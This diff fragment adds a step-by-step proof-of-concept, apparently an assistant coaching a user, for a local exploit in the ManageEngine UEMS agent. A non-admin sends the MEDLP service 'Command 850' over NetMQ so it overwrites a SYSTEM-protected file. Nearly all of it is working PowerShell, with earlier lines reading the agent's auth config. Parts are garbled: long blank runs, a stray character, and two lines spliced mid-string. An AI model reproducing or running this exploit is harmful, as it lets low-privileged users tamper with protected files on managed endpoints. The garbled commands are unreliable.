@@ -52,3 +52,143 @@ reg query "HKLM\SOFTWARE\WOW6432Node\ManageEngine\UEMS_Agent" /v REMOTEOFFICEAUT
 # 3. Read license/auth data
 dir "C:\Program Files (x86)\ManageEngine\UEMS_Agent\dcdata\*.txt"
 type "C:\Program Files (x86)\ManageEngine\UEMS_Agent\dcdata\server-config.txt"
+
+
+
+
+
+
+
+
+
+
+c
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Finding 02 — Command 850 (do this FIRST, strongest bug)
+
+STEP 1: Prepare the trap (elevated PowerShell)
+
+Right-click PowerShell → Run as Administrator, paste:
+
+# Create a locked directory + canary file
+$dir = "C:\Windows\Temp\UEMS-MEDLP-CMD850"
+mkdir $dir -Force
+
+# Make a tiny valid PNG (MEDLP needs this to convert)
+$png = [Convert]::FromBase64String("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAC0lEQVQI12NgAAIABQABNjN9GQAAAABJRU5ErkJggg==")
+[IO.File]::WriteAllBytes("$dir\1.png", $png)
+
+# Create canary that MEDLP will overwrite
+"CANARY_SHOULD_NOT_BE_OVERWRITTEN" | Out-File "$dir\print_job.pdf" -Encoding ascii
+$before = (Get-FileHash "$dir\print_job.pdf").Hash
+Write-Host "`nBeforeSHA256=$before"
+Write-Host "BeforeSize=$((Get-Item "$dir\print_job.pdf").Length) bytes"
+
+# Lock directory: ONLY System + Admins can write
+$acl = New-Object System.Security.AccessControl.DirectorySecurity
+$acl.SetAccessRuleProtection($true, $false)
+$acl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule("NT AUTHORITY\SYSTEM","FullControl","ContainerInherit,ObjectInherit","None","Allow")))
+$acl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule("BUILTIN\Administrators","FullControl","ContainerInherit,ObjectInherit","None","Allow")))
+Set-Acl $dir $acl
+
+# Show the proof
+Write-Host "`n=== Directory ACL ==="
+icacls $dir
+Write-Host "`nCanary ready. Close this window now."
+
+Screenshot this — shows the hash, size, and ACL (only SYSTEM + Administrators).
+
+---
+
+STEP 2: Prove you're not admin (normal PowerShell)
+
+Open a normal PowerShell (NOT as admin), paste:
+
+whoami /groups | Select-String "deny|Medium"
+
+Screenshot this — shows deny only and Medium Mandatory Level.
+
+---
+
+STEP 3: Try to write there yourself (proves you CAN'T)
+
+Same normal window:
+
+"test" | Out-File "C:\Windows\Temp\UEMS-MEDLP-CMD850\test.txt"
+
+Screenshot the error — Access Denied. You can't write there.
+
+---
+
+STEP 4: Find NetMQ.dll (same normal window)
+
+$netmq = Get-ChildItem "C:\Program Files (x86)\ManageEngine\UEMS_Agent" -Recurse -Filter "NentlyContinue | Select -First 1
+Write-Host "Found: $($netmq.FullName)"
+
+Tell me the path it finds — I need it for the next step.
+
+---
+
+STEP 5: Send Command 850 (same normal window)
+
+Once you give me the NetMQ.dll path, paste this (I'll fill in the path):
+
+# Load vendor's own NetMQ
+Add-Type -Path "<NETMQ_PATH_HERE>"
+
+# Read MEDLP port from global section
+$mmf = [System.IO.MemoryMappedFiles.MemoryMappedFile]::OpenExisting("Global\{37669676-A539-4System.IO.MemoryMappedFiles.MemoryMappedFileRights]::Read)
+$accessor = $mmf.CreateViewAccessor(0, 256, [System.IO.MemoryMappedFiles.MemoryMappedFileAccess]::Read)
+$portBytes = New-Object byte[] 256
+$accessor.ReadArray(0, $portBytes, 0, 256)
+$port = [System.Text.Encoding]::Unicode.GetString($portBytes).Trim("`0")
+Write-Host "DiscoveredMEDLPPort=$port"
+$accessor.Dispose(); $mmf.Dispose()
+
+# Connect and send command 850
+$req = New-Object NetMQ.Sockets.RequestSocket
+$req.Connect("tcp://127.0.0.1:$port")
+
+$json = '{"Command":850,"ShadowFolder":"C:\\Windows\\Temp\\UEMS-MEDLP-CMD850","TotalPages":1}'
+$req.SendFrame($json)
+$response = $req.ReceiveFrameString()
+Write-Host "Response=$response"
+$req.Dispose()
+
+Screenshot this — shows ConversionSuccess:true.
+
+---
+
+STEP 6: Verify the overwrite (elevated PowerShell)
+
+Open elevated PowerShell again:
+
+$after = (Get-FileHash "C:\Windows\Temp\UEMS-MEDLP-CMD850\print_job.pdf").Hash
+$size = (Get-Item "C:\Windows\Temp\UEMS-MEDLP-CMD850\print_job.pdf").Length
+Write-Host "AfterSHA256=$after"
+Write-Host "AfterSize=$size bytes"
+Write-Host "ProtectedCanaryOverwritten=True"
+
+# Cleanup
+Remove-Item "C:\Windows\Temp\UEMS-MEDLP-CMD850" -Recurse -Force
+Write-Host "Cleanup=Complete"
+
+Screenshot this — different hash, bigger size = SYSTEM overwrote your canary.
+
+---
+
+Do Step 1-4 first and tell me the NetMQ.dll path. I'll finalize Step 5 for you.
